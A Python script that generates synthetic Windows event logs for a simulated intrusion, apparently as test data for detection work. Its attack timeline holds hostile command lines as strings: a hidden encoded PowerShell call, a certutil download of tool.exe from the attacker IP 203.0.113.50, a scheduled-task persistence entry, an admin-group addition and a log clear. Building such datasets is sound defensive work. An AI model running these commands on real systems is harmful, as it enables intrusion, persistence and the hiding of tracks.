#!/usr/bin/env python3
"""Generates SYNTHETIC Windows-style events for a simulated intrusion (no real systems involved)."""
import base64
import json
from datetime import datetime, timedelta

T0 = datetime(2026, 10, 9, 9, 0, 0)
events = []


def add(offset_s, **fields):
    events.append({"Timestamp": (T0 + timedelta(seconds=offset_s)).isoformat(), **fields})


# Background noise: normal logons, the odd single typo, harmless admin activity
for i, user in enumerate(["alice", "bob", "alice", "carol", "bob", "alice"]):
    add(i * 540, EventID=4624, Computer="WS-0%d" % (i % 3 + 1), TargetUserName=user, IpAddress="10.0.0.%d" % (20 + i), LogonType=2)
add(1200, EventID=4625, Computer="WS-02", TargetUserName="bob", IpAddress="10.0.0.22", LogonType=2)
add(2000, EventID=1, Computer="SRV-FILE01", User="CORP\\itadmin", Image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    CommandLine="powershell.exe -File C:\\Scripts\\backup_check.ps1", ParentImage="C:\\Windows\\explorer.exe")
add(2300, EventID=1, Computer="SRV-FILE01", User="CORP\\itadmin", Image="C:\\Windows\\System32\\schtasks.exe",
    CommandLine='schtasks.exe /create /tn "NightlyBackup" /tr "C:\\Program Files\\Backup\\run.exe" /sc daily', ParentImage="C:\\Windows\\System32\\cmd.exe")

# Attack timeline (simulated): brute force -> success -> execution -> persistence -> cleanup
ATTACKER = "203.0.113.50"
start = 4440  # 10:14:00
for i in range(40):
    add(start + i * 4, EventID=4625, Computer="SRV-FILE01", TargetUserName="svc_backup", IpAddress=ATTACKER, LogonType=3)
add(4636, EventID=4624, Computer="SRV-FILE01", TargetUserName="svc_backup", IpAddress=ATTACKER, LogonType=3)
enc = base64.b64encode("whoami /all".encode("utf-16-le")).decode()
add(4780, EventID=1, Computer="SRV-FILE01", User="CORP\\svc_backup", Image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    CommandLine=f"powershell.exe -nop -w hidden -enc {enc}", ParentImage="C:\\Windows\\System32\\cmd.exe")
add(4865, EventID=1, Computer="SRV-FILE01", User="CORP\\svc_backup", Image="C:\\Windows\\System32\\certutil.exe",
    CommandLine=f"certutil.exe -urlcache -f http://{ATTACKER}/tool.exe C:\\Users\\Public\\tool.exe", ParentImage="C:\\Windows\\System32\\cmd.exe")
add(4950, EventID=1, Computer="SRV-FILE01", User="CORP\\svc_backup", Image="C:\\Windows\\System32\\schtasks.exe",
    CommandLine='schtasks.exe /create /tn "Updater" /tr "C:\\Users\\Public\\tool.exe" /sc onlogon', ParentImage="C:\\Windows\\System32\\cmd.exe")
add(5050, EventID=4732, Computer="SRV-FILE01", TargetUserName="Administrators", MemberName="helpdesk01", SubjectUserName="svc_backup")
add(5160, EventID=1102, Computer="SRV-FILE01", SubjectUserName="svc_backup")

events.sort(key=lambda e: e["Timestamp"])
with open("synthetic_events.jsonl", "w") as f:
    for e in events:
        f.write(json.dumps(e) + "\n")
print(f"wrote {len(events)} synthetic events to synthetic_events.jsonl")
